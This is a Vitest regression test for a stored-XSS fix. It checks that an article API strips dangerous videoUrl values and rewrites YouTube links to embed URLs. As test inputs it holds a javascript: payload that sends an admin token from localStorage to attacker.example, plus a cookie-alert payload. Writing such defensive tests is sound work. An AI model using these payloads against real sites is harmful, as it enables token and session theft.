import { describe, it, expect, beforeAll, afterAll } from "vitest";
import type { AddressInfo } from "node:net";
import type { Server } from "node:http";
import { db, articlesTable, adminSessionsTable, pool } from "@workspace/db";
import { eq, like } from "drizzle-orm";
import { randomBytes } from "node:crypto";
import app from "../app.js";

// Locks in the Site Customization XSS fix for the editorial article surface:
// admin-supplied videoUrl is rendered into a public <iframe src> on the article
// page, so a dangerous value (e.g. javascript:...) is stored XSS able to steal
// the bearer tokens kept in browser storage. The server must normalize every
// write through the video-host allowlist: dangerous/unknown URLs become "" and
// known watch-page URLs are rewritten to their canonical embed origin.

let server: Server;
let baseUrl: string;
let adminToken: string;

const MARK = `__test_videourl_${Date.now()}`;

beforeAll(async () => {
  adminToken = randomBytes(16).toString("hex");
  await db.insert(adminSessionsTable).values({
    token: adminToken,
    username: "test-admin",
    expiresAt: new Date(Date.now() + 60 * 60 * 1000),
  });

  server = app.listen(0);
  await new Promise<void>((resolve) => server.once("listening", () => resolve()));
  const port = (server.address() as AddressInfo).port;
  baseUrl = `http://127.0.0.1:${port}`;
});

afterAll(async () => {
  await db.delete(articlesTable).where(like(articlesTable.title, `${MARK}%`));
  if (adminToken) await db.delete(adminSessionsTable).where(eq(adminSessionsTable.token, adminToken));
  await new Promise<void>((resolve) => server.close(() => resolve()));
  await pool.end();
});

async function createArticle(videoUrl: string): Promise<{ id: number; videoUrl: string | null }> {
  const res = await fetch(`${baseUrl}/api/articles`, {
    method: "POST",
    headers: { "content-type": "application/json", "x-admin-token": adminToken },
    body: JSON.stringify({
      title: `${MARK}-${Math.random().toString(36).slice(2)}`,
      content: "body",
      category: "international",
      language: "ml",
      status: "published",
      videoUrl,
    }),
  });
  expect(res.status).toBe(201);
  return (await res.json()) as { id: number; videoUrl: string | null };
}

describe("article videoUrl sanitization", () => {
  it("drops a javascript: URL to an empty string on create", async () => {
    const a = await createArticle(
      "javascript:parent.fetch('https://attacker.example/?t='+localStorage.getItem('gp_admin_token'))",
    );
    expect(a.videoUrl).toBe("");
  });

  it("drops an arbitrary http host not on the allowlist", async () => {
    const a = await createArticle("https://attacker.example/evil.html");
    expect(a.videoUrl).toBe("");
  });

  it("normalizes a YouTube watch URL to its canonical embed origin", async () => {
    const a = await createArticle("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
    expect(a.videoUrl).toBe("https://www.youtube.com/embed/dQw4w9WgXcQ");
  });

  it("normalizes a videoUrl supplied via PATCH", async () => {
    const a = await createArticle("https://youtu.be/dQw4w9WgXcQ");
    expect(a.videoUrl).toBe("https://www.youtube.com/embed/dQw4w9WgXcQ");

    const patch = await fetch(`${baseUrl}/api/articles/${a.id}`, {
      method: "PATCH",
      headers: { "content-type": "application/json", "x-admin-token": adminToken },
      body: JSON.stringify({ videoUrl: "javascript:alert(document.cookie)" }),
    });
    expect(patch.status).toBe(200);
    const updated = (await patch.json()) as { videoUrl: string | null };
    expect(updated.videoUrl).toBe("");
  });

  it("preserves an existing videoUrl when a PATCH omits the field", async () => {
    const a = await createArticle("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
    expect(a.videoUrl).toBe("https://www.youtube.com/embed/dQw4w9WgXcQ");

    const patch = await fetch(`${baseUrl}/api/articles/${a.id}`, {
      method: "PATCH",
      headers: { "content-type": "application/json", "x-admin-token": adminToken },
      body: JSON.stringify({ title: `${MARK}-renamed` }),
    });
    expect(patch.status).toBe(200);
    const updated = (await patch.json()) as { videoUrl: string | null };
    expect(updated.videoUrl).toBe("https://www.youtube.com/embed/dQw4w9WgXcQ");
  });
});
